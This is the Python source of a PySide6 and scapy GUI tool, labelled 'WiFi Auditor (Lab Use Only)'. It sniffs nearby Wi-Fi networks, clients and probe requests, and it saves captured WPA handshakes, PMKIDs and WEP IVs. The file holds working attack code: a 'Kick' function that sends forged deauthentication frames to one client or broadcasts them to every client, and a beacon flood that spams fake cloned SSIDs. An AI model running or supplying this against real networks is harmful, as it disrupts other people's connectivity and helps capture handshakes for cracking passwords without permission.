import sys
import os
import time
import threading
from collections import defaultdict
from scapy.all import (
    sniff, sendp, RadioTap, Dot11, Dot11Beacon, Dot11Deauth, Dot11Elt,
    Dot11Auth, Dot11ProbeReq, Dot11ProbeResp, EAPOL, wrpcap, hexdump
)
from PySide6.QtWidgets import (
    QApplication, QWidget, QVBoxLayout, QHBoxLayout, QTableWidget, QTableWidgetItem,
    QLabel, QPushButton, QComboBox, QTabWidget, QCheckBox, QFileDialog,
    QHeaderView, QSpinBox, QLineEdit, QMessageBox
)
from PySide6.QtCore import Qt, QTimer, Signal, QObject

OUI_VENDOR_MAP = {
    "F0:6C:5D": "Xiaomi Communications Co Ltd",
    "F4:8B:32": "Xiaomi Communications Co Ltd",
    "8C:85:90": "Intel Corporate",
    "00:11:22": "Cisco Systems",
    "DC:A6:32": "Apple, Inc.",
    "B8:27:EB": "Raspberry Pi Foundation"
}

def mac_to_vendor(mac):
    prefix = ":".join(mac.upper().split(":")[:3])
    return OUI_VENDOR_MAP.get(prefix, "Unknown")

def rssi_to_icon(rssi):
    if rssi >= -50:
        return "📶📶📶📶"
    elif rssi >= -60:
        return "📶📶📶"
    elif rssi >= -70:
        return "📶📶"
    elif rssi >= -90:
        return "📶"
    else:
        return "✖"

class Notifier(QObject):
    handshake = Signal(str)
    pmkid = Signal(str)
    wepivs = Signal(str)

notifier = Notifier()

def get_next_capture_filename(basepath, prefix):
    # Find the next available file airsniff_<prefix>-01.cap, -02.cap, etc.
    i = 1
    while True:
        fname = os.path.join(basepath, f"airsniff_{prefix:}-{'%02d'%i}.cap")
        if not os.path.exists(fname):
            return fname
        i += 1

class WiFiAuditor(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("WiFi Auditor (Lab Use Only)")
        self.resize(1200, 700)
        self.capture_dir = os.path.abspath("captures")
        os.makedirs(self.capture_dir, exist_ok=True)
        self.iface = None
        self.channel = 1
        self.running = False
        self.networks = {}  # bssid: dict
        self.clients = defaultdict(dict)  # bssid: {station_mac:dict}
        self.probes = defaultdict(list)  # station_mac: [ssid,...]
        self.handshakes = defaultdict(list)  # bssid: [pkt,...]
        self.pmkids = defaultdict(list)     # bssid: [pkt,...]
        self.wep_ivs = defaultdict(list)    # bssid: [pkt,...]
        self.all_packets = []               # all captured packets for global save
        self.selected_bssid = None
        self.channel_hop = True
        self.hop_thread = None

        self.init_ui()
        self.capture_thread = None
        self.update_timer = QTimer()
        self.update_timer.timeout.connect(self.refresh_tables)
        self.update_timer.start(1000)

        notifier.handshake.connect(self.notify_handshake)
        notifier.pmkid.connect(self.notify_pmkid)
        notifier.wepivs.connect(self.notify_wepivs)

    def init_ui(self):
        layout = QVBoxLayout(self)
        # Interface & channel selection
        ifacebox = QHBoxLayout()
        self.iface_combo = QComboBox()
        self.refresh_ifaces()
        ifacebox.addWidget(QLabel("Interface:"))
        ifacebox.addWidget(self.iface_combo)
        self.chan_combo = QSpinBox()
        self.chan_combo.setRange(1, 165)
        ifacebox.addWidget(QLabel("Channel:"))
        ifacebox.addWidget(self.chan_combo)
        self.chan_auto = QCheckBox("Auto channel (fix on selected network)")
        ifacebox.addWidget(self.chan_auto)
        self.channel_hop_box = QCheckBox("Channel hopping")
        self.channel_hop_box.setChecked(True)
        ifacebox.addWidget(self.channel_hop_box)
        self.start_btn = QPushButton("Start Audit")
        self.start_btn.clicked.connect(self.start_audit)
        ifacebox.addWidget(self.start_btn)
        self.stop_btn = QPushButton("Stop Audit")
        self.stop_btn.clicked.connect(self.stop_audit)
        ifacebox.addWidget(self.stop_btn)
        self.save_all_btn = QPushButton("Save All")
        self.save_all_btn.clicked.connect(self.save_all_capture)
        ifacebox.addWidget(self.save_all_btn)
        layout.addLayout(ifacebox)

        self.notify_label = QLabel("")
        layout.addWidget(self.notify_label)

        self.tabs = QTabWidget(self)
        layout.addWidget(self.tabs)

        main_tab = QWidget()
        main_layout = QVBoxLayout(main_tab)
        self.net_table = QTableWidget(0, 9)  # removed "Save" column
        self.net_table.setHorizontalHeaderLabels([
            "SSID", "BSSID", "ENC", "AUTH", "CIPHER", "PWR", "CH", "Vendor", "Kick All"
        ])
        self.net_table.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch)
        self.net_table.setSelectionBehavior(QTableWidget.SelectRows)
        self.net_table.cellClicked.connect(self.network_selected)
        main_layout.addWidget(QLabel("Discovered Networks"))
        main_layout.addWidget(self.net_table)

        self.clients_table = QTableWidget(0, 5)
        self.clients_table.setHorizontalHeaderLabels([
            "Client MAC", "Vendor", "Probes", "Kick", "Save"
        ])
        self.clients_table.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch)
        main_layout.addWidget(QLabel("Clients & Probes"))
        main_layout.addWidget(self.clients_table)

        self.tabs.addTab(main_tab, "Networks & Clients")

        beacon_tab = QWidget()
        beacon_layout = QVBoxLayout(beacon_tab)
        self.ssid_flood_table = QTableWidget(0,3)
        self.ssid_flood_table.setHorizontalHeaderLabels(["SSID Name", "Clone Count", "Remove"])
        self.ssid_flood_table.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch)
        beacon_layout.addWidget(QLabel("Beacon Flood List"))
        beacon_layout.addWidget(self.ssid_flood_table)
        add_row = QHBoxLayout()
        self.ssid_flood_name = QLineEdit()
        add_row.addWidget(QLabel("SSID:"))
        add_row.addWidget(self.ssid_flood_name)
        self.ssid_flood_count = QSpinBox()
        self.ssid_flood_count.setRange(1, 100)
        add_row.addWidget(QLabel("Clone x"))
        add_row.addWidget(self.ssid_flood_count)
        self.add_flood_btn = QPushButton("Add SSID")
        self.add_flood_btn.clicked.connect(self.add_beacon_flood)
        add_row.addWidget(self.add_flood_btn)
        beacon_layout.addLayout(add_row)
        self.flood_btn = QPushButton("Start Beacon Flood")
        self.flood_btn.clicked.connect(self.start_beacon_flood)
        beacon_layout.addWidget(self.flood_btn)
        self.tabs.addTab(beacon_tab, "Beacon Flood")

    def refresh_ifaces(self):
        self.iface_combo.clear()
        try:
            for iface in os.listdir("/sys/class/net"):
                if "wl" in iface or "mon" in iface:
                    self.iface_combo.addItem(iface)
        except Exception:
            self.iface_combo.addItem("mon0")  # fallback

    def refresh_tables(self):
        self.net_table.setRowCount(len(self.networks))
        for row, (bssid, net) in enumerate(self.networks.items()):
            ssid = net.get('ssid', '')
            enc = net.get('enc', '-')
            auth = net.get('auth', '-')
            cipher = net.get('cipher', '-')
            pwr = net.get('signal', -100)
            ch = net.get('channel', 1)
            vendor = mac_to_vendor(bssid)
            kick_btn = QPushButton("Kick All")
            kick_btn.clicked.connect(lambda _, b=bssid: self.kick_all(b))
            items = [
                QTableWidgetItem(ssid),
                QTableWidgetItem(bssid),
                QTableWidgetItem(enc),
                QTableWidgetItem(auth),
                QTableWidgetItem(cipher),
                QTableWidgetItem(f"{rssi_to_icon(pwr)} {pwr} dBm"),
                QTableWidgetItem(str(ch)),
                QTableWidgetItem(vendor),
            ]
            for col, item in enumerate(items):
                item.setFlags(Qt.ItemIsEnabled | Qt.ItemIsSelectable)
                self.net_table.setItem(row, col, item)
            self.net_table.setCellWidget(row, 8, kick_btn)
            # Removed per-network Save button

        # Clients table is unchanged
        all_clients = []
        for bssid, clients in self.clients.items():
            for client_mac, client in clients.items():
                all_clients.append((client_mac, bssid, client))
        self.clients_table.setRowCount(len(all_clients))
        for row, (client_mac, bssid, client) in enumerate(all_clients):
            vendor = mac_to_vendor(client_mac)
            probes = ', '.join(self.probes.get(client_mac, []))
            kick_btn = QPushButton("Kick")
            kick_btn.clicked.connect(lambda _, m=client_mac, b=bssid: self.kick_client(m, b))
            save_btn = QPushButton("Save")
            save_btn.clicked.connect(lambda _, m=client_mac, b=bssid: self.save_client_capture(m, b))
            items = [
                QTableWidgetItem(client_mac),
                QTableWidgetItem(vendor),
                QTableWidgetItem(probes if probes else "(not associated)"),
            ]
            for col, item in enumerate(items):
                item.setFlags(Qt.ItemIsEnabled | Qt.ItemIsSelectable)
                self.clients_table.setItem(row, col, item)
            self.clients_table.setCellWidget(row, 3, kick_btn)
            self.clients_table.setCellWidget(row, 4, save_btn)

    def network_selected(self, row, col):
        bssid = self.net_table.item(row, 1).text()
        self.selected_bssid = bssid
        if self.chan_auto.isChecked():
            ch = self.networks[bssid].get('channel', 1)
            self.chan_combo.setValue(ch)
        # On click, immediately save capture for that BSSID
        self.save_capture(bssid)

    def start_audit(self):
        self.iface = self.iface_combo.currentText()
        self.channel = self.chan_combo.value()
        self.channel_hop = self.channel_hop_box.isChecked()
        if not self.iface:
            QMessageBox.warning(self, "No Interface", "Please select a network interface!")
            return
        self.running = True
        if self.capture_thread is None or not self.capture_thread.is_alive():
            self.capture_thread = threading.Thread(target=self.sniff_packets, daemon=True)
            self.capture_thread.start()
        if self.channel_hop and (self.hop_thread is None or not self.hop_thread.is_alive()):
            self.hop_thread = threading.Thread(target=self.hopper, daemon=True)
            self.hop_thread.start()
        self.notify_label.setText("Audit started.")

    def stop_audit(self):
        self.running = False
        self.notify_label.setText("Audit stopped.")

    def hopper(self):
        while self.running and self.channel_hop:
            for ch in range(1, 14):
                os.system(f"iwconfig {self.iface} channel {ch}")
                self.channel = ch
                time.sleep(0.8)
                if not self.running or not self.channel_hop:
                    break

    def sniff_packets(self):
        def pkt_handler(pkt):
            self.all_packets.append(pkt)
            if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
                bssid = pkt[Dot11].addr2
                ssid = ""
                elt = pkt.getlayer(Dot11Elt)
                while elt:
                    if elt.ID == 0:
                        try:
                            ssid = elt.info.decode(errors='replace').strip()
                        except Exception:
                            ssid = ""
                        break
                    elt = elt.payload.getlayer(Dot11Elt)
                ch = 1
                elt = pkt.getlayer(Dot11Elt)
                while elt:
                    if elt.ID == 3:
                        ch = int.from_bytes(elt.info, "little")
                        break
                    elt = elt.payload.getlayer(Dot11Elt)
                rssi = pkt.dBm_AntSignal if hasattr(pkt, "dBm_AntSignal") else -100
                enc, auth, cipher = self.parse_network(pkt)
                self.networks[bssid] = {
                    "ssid": ssid, "channel": ch, "signal": rssi,
                    "enc": enc, "auth": auth, "cipher": cipher,
                }
            elif pkt.haslayer(Dot11) and pkt.type == 2:
                addr1 = pkt[Dot11].addr1
                addr2 = pkt[Dot11].addr2
                bssid = pkt[Dot11].addr3
                if addr1 and addr2 and bssid:
                    self.clients[bssid][addr2] = {"last": time.time()}
            elif pkt.haslayer(Dot11ProbeReq):
                mac = pkt[Dot11].addr2
                elt = pkt.getlayer(Dot11Elt)
                while elt:
                    if elt.ID == 0:
                        try:
                            ssid = elt.info.decode(errors='replace').strip()
                            if ssid and ssid not in self.probes[mac]:
                                self.probes[mac].append(ssid)
                        except Exception:
                            pass
                        break
                    elt = elt.payload.getlayer(Dot11Elt)
            if pkt.haslayer(EAPOL) and pkt.haslayer(Dot11):
                bssid = pkt[Dot11].addr2
                self.handshakes[bssid].append(pkt)
                print(f"WPA-Handshake: {bssid} !!!")
                notifier.handshake.emit(bssid)
            if pkt.haslayer(Dot11Auth) and pkt.haslayer(Dot11):
                bssid = pkt[Dot11].addr1
                if pkt[Dot11Auth].algo == 0:
                    elt = pkt.getlayer(Dot11Elt)
                    while elt:
                        if elt.ID == 48 and b'\x00\x00' in elt.info:
                            self.pmkids[bssid].append(pkt)
                            print(f"Possible PMKID {bssid} !!!")
                            notifier.pmkid.emit(bssid)
                            break
                        elt = elt.payload.getlayer(Dot11Elt)
            if pkt.haslayer(Dot11):
                bssid = pkt[Dot11].addr2
                if self.networks.get(bssid, {}).get("enc", "") == "WEP":
                    if hasattr(pkt, "iv"):
                        self.wep_ivs[bssid].append(pkt)
                        if len(self.wep_ivs[bssid]) >= 10:
                            notifier.wepivs.emit(bssid)

        sniff(iface=self.iface, prn=pkt_handler, store=0, stop_filter=lambda x: not self.running)

    def parse_network(self, pkt):
        enc = "OPN"
        auth = "-"
        cipher = "-"
        elt = pkt.getlayer(Dot11Elt)
        privacy = False
        wpa = False
        wpa2 = False
        rsn_akm = []
        rsn_cipher = []
        while elt:
            if elt.ID == 48:  # RSN (WPA2/3)
                wpa2 = True
                info = elt.info
                if len(info) >= 8:
                    pairwise = int.from_bytes(info[2:4], 'little')
                    if pairwise == 1:
                        rsn_cipher.append("WEP40")
                    elif pairwise == 2:
                        rsn_cipher.append("TKIP")
                    elif pairwise == 4:
                        rsn_cipher.append("CCMP")
                    elif pairwise == 8:
                        rsn_cipher.append("GCMP")
                if len(info) > 13:
                    akm = int.from_bytes(info[12:14], 'little')
                    if akm == 1:
                        rsn_akm.append("PSK")
                    elif akm == 2:
                        rsn_akm.append("MGT")
                    elif akm == 3:
                        rsn_akm.append("SAE")
            if elt.ID == 221 and b"WPA" in elt.info:
                wpa = True
            if elt.ID == 1 and elt.info and elt.info[0] & 0x10:
                privacy = True
            elt = elt.payload.getlayer(Dot11Elt)
        if wpa2:
            enc = "WPA2"
            auth = "/".join(rsn_akm) if rsn_akm else "PSK"
            cipher = "/".join(rsn_cipher) if rsn_cipher else "CCMP"
        elif wpa:
            enc = "WPA"
            auth = "PSK"
            cipher = "TKIP"
        elif privacy:
            enc = "WEP"
            auth = "SKA/OPN"
            cipher = "WEP40"
        else:
            enc = "OPN"
            auth = "-"
            cipher = "-"
        return enc, auth, cipher

    def kick_all(self, bssid):
        ch = self.networks.get(bssid, {}).get("channel", self.channel)
        threading.Thread(target=self.send_deauth, args=(bssid, None, ch, 20), daemon=True).start()

    def kick_client(self, mac, bssid):
        ch = self.networks.get(bssid, {}).get("channel", self.channel)
        threading.Thread(target=self.send_deauth, args=(bssid, mac, ch, 50), daemon=True).start()

    def send_deauth(self, bssid, client_mac, channel, count):
        os.system(f"iwconfig {self.iface} channel {channel}")
        addr1 = client_mac if client_mac else "ff:ff:ff:ff:ff:ff"
        for _ in range(count):
            pkt = RadioTap()/Dot11(addr1=addr1, addr2=bssid, addr3=bssid)/Dot11Deauth(reason=7)
            sendp(pkt, iface=self.iface, verbose=0)
            time.sleep(0.01)

    def save_all_capture(self):
        fname = get_next_capture_filename(self.capture_dir, "all")
        wrpcap(fname, self.all_packets)
        self.notify_label.setText(f"Saved all packets to {fname}")

    def save_capture(self, bssid):
        fname = get_next_capture_filename(self.capture_dir, bssid.replace(":", ""))
        pkts = []
        pkts.extend(self.handshakes.get(bssid, []))
        pkts.extend(self.pmkids.get(bssid, []))
        pkts.extend(self.wep_ivs.get(bssid, []))
        # Also add all packets for this BSSID
        pkts.extend([p for p in self.all_packets if p.haslayer(Dot11) and getattr(p[Dot11], 'addr2', None) == bssid])
        wrpcap(fname, pkts)
        self.notify_label.setText(f"Saved packets for {bssid} to {fname}")

    def save_client_capture(self, mac, bssid):
        fname = get_next_capture_filename(self.capture_dir, mac.replace(":", ""))
        pkts = []
        pkts.extend(self.clients[bssid].get(mac, {}).get("pkts", []))
        wrpcap(fname, pkts)
        self.notify_label.setText(f"Saved packets for client {mac} to {fname}")

    def add_beacon_flood(self):
        ssid = self.ssid_flood_name.text().strip()
        count = self.ssid_flood_count.value()
        if ssid:
            row = self.ssid_flood_table.rowCount()
            self.ssid_flood_table.insertRow(row)
            self.ssid_flood_table.setItem(row, 0, QTableWidgetItem(ssid))
            self.ssid_flood_table.setItem(row, 1, QTableWidgetItem(str(count)))
            del_btn = QPushButton("Remove")
            del_btn.clicked.connect(lambda _, r=row: self.ssid_flood_table.removeRow(r))
            self.ssid_flood_table.setCellWidget(row, 2, del_btn)

    def start_beacon_flood(self):
        ssids = []
        for row in range(self.ssid_flood_table.rowCount()):
            ssid = self.ssid_flood_table.item(row, 0).text()
            count = int(self.ssid_flood_table.item(row, 1).text())
            ssids.extend([ssid]*count)
        threading.Thread(target=self.flood_beacons, args=(ssids,), daemon=True).start()

    def flood_beacons(self, ssids):
        for ssid in ssids:
            for _ in range(5):
                pkt = RadioTap()/Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2="de:ad:be:ef:00:01", addr3="de:ad:be:ef:00:01")/Dot11Beacon()/Dot11Elt(ID="SSID", info=ssid)
                sendp(pkt, iface=self.iface, verbose=0)
                time.sleep(0.01)
        self.notify_label.setText("Beacon flood in progress.")

    def notify_handshake(self, bssid):
        self.notify_label.setText(f"Handshake captured for {bssid}!")

    def notify_pmkid(self, bssid):
        self.notify_label.setText(f"PMKID captured for {bssid}!")

    def notify_wepivs(self, bssid):
        self.notify_label.setText(f"WEP IVS >= 10 captured for {bssid}!")

if __name__ == "__main__":
    app = QApplication(sys.argv)
    auditor = WiFiAuditor()
    auditor.show()
    sys.exit(app.exec())
